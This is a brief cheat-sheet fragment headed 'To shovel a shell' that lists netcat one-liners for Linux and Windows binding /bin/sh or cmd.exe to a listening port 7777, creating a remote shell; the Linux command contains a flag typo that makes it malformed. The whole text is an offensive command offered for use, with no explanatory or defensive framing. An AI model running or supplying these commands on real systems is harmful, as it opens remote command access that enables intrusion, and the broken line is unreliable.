#### To shovel a shell
**Linux**
```
nc -l nvp 7777 -e /bin/sh
```

**Windows**
```
nc -nvlp 7777 -e cmd.exe
```